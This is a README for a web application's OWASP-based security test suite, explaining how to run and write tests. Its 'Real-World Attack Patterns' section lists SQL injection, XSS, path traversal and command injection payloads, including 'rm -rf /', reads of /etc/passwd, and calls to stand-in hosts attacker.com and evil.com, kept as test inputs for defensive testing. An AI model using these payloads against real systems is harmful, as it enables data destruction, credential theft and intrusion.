# Security Tests - Quick Reference Guide

## Overview

This directory contains comprehensive security tests for the CDI application based on OWASP Top 10 and industry best practices.

## File Structure

```
tests/security/
├── __init__.py                    # Package initialization
├── test_security.py               # Main security test suite (41 tests)
├── SECURITY_TEST_REPORT.md        # Detailed test results and findings
└── README.md                      # This file
```

## Quick Start

### Running All Security Tests

```bash
# Run all security tests with verbose output
pytest tests/security/ -v -m security

# Run with coverage report
pytest tests/security/ --cov=proyecto_maria --cov-report=html

# Run and stop on first failure
pytest tests/security/ -x

# Run only failed tests from last run
pytest tests/security/ --lf
```

### Running Specific Test Categories

```bash
# Access Control tests
pytest tests/security/test_security.py::TestBrokenAccessControl -v

# Injection tests
pytest tests/security/test_security.py::TestInjectionVulnerabilities -v

# File upload security
pytest tests/security/test_security.py::TestDataIntegrityFailures -v

# All security headers tests
pytest tests/security/test_security.py::TestSecurityMisconfiguration -v
```

## Test Categories

### 1. Broken Access Control (5 tests)
Tests for authentication bypass, path traversal, privilege escalation

**Key Tests:**
- Unauthenticated access prevention
- Path traversal in file downloads
- Horizontal/vertical privilege escalation
- Forced browsing to hidden endpoints

### 2. Cryptographic Failures (3 tests)
Tests for sensitive data exposure and weak cryptography

**Key Tests:**
- Sensitive data in error messages
- JWT token validation
- Credentials in response headers

### 3. Injection Vulnerabilities (5 tests)
Tests for SQL, NoSQL, Command, and XSS injection

**Key Tests:**
- SQL injection in login
- NoSQL injection in API queries
- Command injection in filenames
- XSS (reflected and stored)

### 4. Insecure Design (3 tests)
Tests for rate limiting and business logic flaws

**Key Tests:**
- Rate limiting enforcement
- Business logic validation
- Negative quantities handling

### 5. Security Misconfiguration (7 tests)
Tests for security headers and configuration

**Key Tests:**
- All security headers present
- X-Frame-Options, X-Content-Type-Options, CSP
- Default credentials rejected
- Verbose error messages disabled

### 6. Authentication Failures (3 tests)
Tests for weak passwords and session management

**Key Tests:**
- Weak password rejection
- Session timeout
- Token invalidation on logout

### 7. Data Integrity Failures (6 tests)
Tests for file upload validation

**Key Tests:**
- Malicious file rejection
- Oversized file rejection
- MIME type validation
- File extension validation

### 8. SSRF (2 tests)
Tests for Server-Side Request Forgery

**Key Tests:**
- Internal network access blocked
- Cloud metadata access blocked

### 9. Additional Controls (5 tests)
Tests for CORS, HTTP methods, etc.

**Key Tests:**
- CORS configuration
- Dangerous HTTP methods disabled
- Directory listing disabled

### 10. DoS Protection (2 tests)
Tests for Denial of Service prevention

**Key Tests:**
- Large request body handling
- Regular expression DoS (ReDoS) prevention

## Adding New Security Tests

### Template for New Test

```python
@pytest.mark.security
class TestNewSecurityCategory:
    """
    Test suite for [vulnerability type] (OWASP A##:2021 or CWE-###)

    Tests for:
    - [specific vulnerability 1]
    - [specific vulnerability 2]
    """

    def test_descriptive_name(self, client):
        """Test that [specific security control] prevents [attack]"""
        # Arrange: Prepare attack payload
        malicious_payload = "attack_string"

        # Act: Attempt the attack
        response = client.post("/endpoint", json={"data": malicious_payload})

        # Assert: Verify attack was blocked
        assert response.status_code in [400, 403, 422], \\
            f"Attack was not blocked: {malicious_payload}"

        # Optional: Verify sanitization
        if response.status_code == 200:
            result = response.json()
            assert malicious_payload not in str(result), \\
                "Malicious payload not sanitized"
```

### Best Practices

1. **Use Descriptive Names**
   - Bad: `test_security_1`
   - Good: `test_sql_injection_in_login_prevented`

2. **Document the Attack**
   ```python
   def test_xss_reflected(self):
       """Test reflected XSS prevention (CWE-79)

       Tests that script tags in user input are:
       1. Either rejected with 400/422
       2. Or escaped/sanitized in output
       """
   ```

3. **Test Multiple Payloads**
   ```python
   payloads = [
       "<script>alert('XSS')</script>",
       "<img src=x onerror=alert('XSS')>",
       "javascript:alert('XSS')",
   ]

   for payload in payloads:
       # Test each payload
   ```

4. **Use Appropriate Status Codes**
   - `400` - Bad Request (validation failed)
   - `401` - Unauthorized (authentication required)
   - `403` - Forbidden (insufficient permissions)
   - `422` - Unprocessable Entity (Pydantic validation)
   - `429` - Too Many Requests (rate limiting)

5. **Test Both Rejection and Sanitization**
   ```python
   # Option 1: Attack is rejected
   assert response.status_code in [400, 403, 422]

   # Option 2: Attack is accepted but sanitized
   if response.status_code == 200:
       assert "<script>" not in response.json()["output"]
   ```

## Real-World Attack Patterns

### SQL Injection Payloads
```python
sql_payloads = [
    "admin' OR '1'='1",
    "admin'--",
    "'; DROP TABLE users--",
    "1' UNION SELECT NULL, username, password FROM users--",
]
```

### XSS Payloads
```python
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
]
```

### Path Traversal Payloads
```python
traversal_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",  # URL encoded
    "..%252fetc%252fpasswd",  # Double encoded
]
```

### Command Injection Payloads
```python
command_payloads = [
    "file.pdf; rm -rf /",
    "file.pdf && cat /etc/passwd",
    "file.pdf | nc attacker.com 1234",
    "file.pdf `whoami`",
    "file.pdf $(curl evil.com)",
]
```

## Security Test Checklist

When adding a new endpoint, verify:

- [ ] Authentication required (if applicable)
- [ ] Authorization checks (role/permission based)
- [ ] Input validation (length, type, format)
- [ ] Output sanitization (XSS prevention)
- [ ] Rate limiting configured
- [ ] SQL injection prevented (parameterized queries)
- [ ] File upload validation (if applicable)
- [ ] Path traversal prevented
- [ ] Sensitive data not logged
- [ ] Error messages don't leak information
- [ ] CORS configured correctly

## CI/CD Integration

### GitHub Actions Example

```yaml
name: Security Tests

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: 3.11
      - name: Install dependencies
        run: pip install -r requirements.txt
      - name: Run security tests
        run: pytest tests/security/ -v -m security --tb=short
      - name: Upload results
        if: failure()
        uses: actions/upload-artifact@v2
        with:
          name: security-test-results
          path: pytest-report.html
```

## Common Issues and Solutions

### Issue: Test Client vs Real HTTP

```python
# Test client doesn't test all middleware layers
# For full testing, use actual HTTP requests:

import requests

def test_with_real_http():
    response = requests.get("http://localhost:8000/api/endpoint")
    assert response.status_code == 401
```

### Issue: Rate Limiting in Tests

```python
# Rate limiter may share state between tests
# Use fixtures to reset state:

@pytest.fixture
def reset_rate_limiter():
    # Reset rate limiter state
    yield
    # Cleanup
```

### Issue: Authentication in Tests

```python
# Use fixture for auth headers:

@pytest.fixture
def auth_headers(client):
    response = client.post("/auth/login", json={
        "username": "test",
        "password": "test123"
    })
    token = response.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}

def test_protected_endpoint(client, auth_headers):
    response = client.get("/api/protected", headers=auth_headers)
    assert response.status_code == 200
```

## Additional Resources

- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [FastAPI Security](https://fastapi.tiangolo.com/tutorial/security/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

## Support

For questions or issues with security tests:
1. Check the [SECURITY_TEST_REPORT.md](./SECURITY_TEST_REPORT.md)
2. Review existing test patterns
3. Consult OWASP documentation
4. Create an issue with the `security` label

---

**Last Updated:** 2025-10-30
**Test Suite Version:** 1.0.0
